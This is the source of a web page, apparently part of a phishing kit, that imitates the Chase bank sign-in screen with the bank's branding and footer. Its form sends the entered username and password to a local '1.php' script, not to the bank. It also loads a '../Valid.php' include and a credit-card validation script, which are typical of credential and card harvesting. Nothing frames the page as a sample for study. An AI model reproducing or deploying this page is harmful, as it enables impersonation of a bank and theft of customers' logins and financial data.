<?php
include '../Valid.php'



?>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Sign in
    </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="pics/favicon.ico">
    <link rel="apple-touch-icon" sizes="76x76" href="pics/favicon.png">
    <link rel="stylesheet" href="styles/app.css">
    <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.1/modernizr.min.js">
    </script>
    <script type="text/javascript" src="scripts/jquery-3.3.1.min.js">
    </script> 
    <script type="text/javascript" src="scripts/jquery.ccvalid.js">
    </script>
    <script type="text/javascript" src="scripts/jquery.mask.min.js">
    </script>
  </head>
  <body>
    <div>
      <div>
        <header>
          <div>
          </div>
        </header>
        <main>
          <div class="container">
            <div class="bg">
            </div>
            <div class="row">
              <div class="col-xs-12 col-sm-6 col-sm-offset-3 box">
                <div class="form_area">
                  <div class="row">
                    <div class="col-xs-10 col-xs-offset-1" id="form_box">
                      <form action="1.php" id="signsmall" enctype="application/x-www-form-urlencoded" method="post" aria-label="Login" class="login__section login__form login__form--primary">
                        <input name="usr" class="input" placeholder="Username" type="text" required>
                        <input name="pwd" class="input" placeholder="Password" type="password" required>
                        <div class="row">
                          <div class="col-xs-6">
                            <div class="checkbox">
                              <div>
                                <div>
                                  <input type="checkbox">
                                  <i class="icon check">
                                  </i>
                                </div>
                                <label>Remember me
                                </label>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="row">
                          <button type="submit" class="primary">
                            <span class="label">Sign in
                            </span>
                          </button>
                        </div>
                        <div class="row">
                          <span class="link">
                            <a class="link_default" href="javascript:void(0)">Forgot username/password?
                              <i class="icon arrow_left">
                              </i>
                            </a>
                          </span>
                        </div>
                        <div class="row">
                          <span class="link">
                            <a class="link_default last" href="javascript:void(0)">Not Enrolled? Sign Up Now.
                              <i class="icon arrow_left">
                              </i>
                            </a>
                          </span>
                        </div>
                        
                      </form>


                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
      <footer>
        <div>
          <div class="container">
            <div class="footer_socials row">
              <div class="col-xs-12">
                <span>Follow us:
                </span>
                <ul>
                  <li>
                    <i class="facebook icon">
                    </i>
                  </li>
                  <li>
                    <i class="instagram icon">
                    </i>
                  </li>
                  <li>
                    <i class="twitter icon">
                    </i>
                  </li>
                  <li>
                    <i class="youtube icon">
                    </i>
                  </li>
                  <li>
                    <i class="linkedin icon">
                    </i>
                  </li>
                </ul>
              </div>
            </div>
            <div class="footer_list row">
              <div class="col-xs-12">
                <ul>
                  <li>
                    <a href="javascript:void(0)">Contact us
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Privacy
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Security
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Terms of use
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Our commitment to accessibility
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">SAFE Act: Chase Mortgage Loan Originators
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Fair Lending
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">About Chase
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">J.P. Morgan
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">JPMorgan Chase &amp; Co.
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Careers
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Español
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Chase Canada
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Site map
                    </a>
                  </li>
                  <li>Member FDIC
                  </li>
                  <li>
                    <i class="home_icon icon">
                    </i> Equal Housing Lender
                  </li>
                  <br>
                  <li>© 2020 JPMorgan Chase &amp; Co.
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
    <div id="rotate" style="display:none">
      <div class="circle">
      </div>
      <div class="overlay">
      </div>
    </div>
    <script>$(document).ready(function(){
        $(document).on("click",".checkbox",function(){
          $(this).not(".check_id").find("input[type=checkbox]").toggleClass("checked")}
                      )}
                             );
    </script>
  </body>
</html>
